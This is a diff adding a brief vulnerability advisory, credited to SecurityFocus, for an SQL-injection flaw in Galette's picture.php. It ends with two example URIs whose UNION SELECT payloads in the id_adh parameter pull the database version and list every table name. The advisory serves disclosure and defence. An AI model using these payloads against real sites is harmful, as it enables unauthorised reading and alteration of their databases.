@@ -1,0 +1,15 @@
+Source: http://www.securityfocus.com/bid/53463/info
+
+Galette is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query. 
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+Versions prior to Galette 0.7.x are vulnerable.
+
+Attackers can use a browser to exploit this issue. 
+
+The following example URIs are available. 
+
+http://server/picture.php?id_adh=0+and+1=0+union+select+@@version,null 
+
+http://server/picture.php?id_adh=0+and+1=0+union+select+group_concat(table_name,char(10)),null+from+information_schema.tables
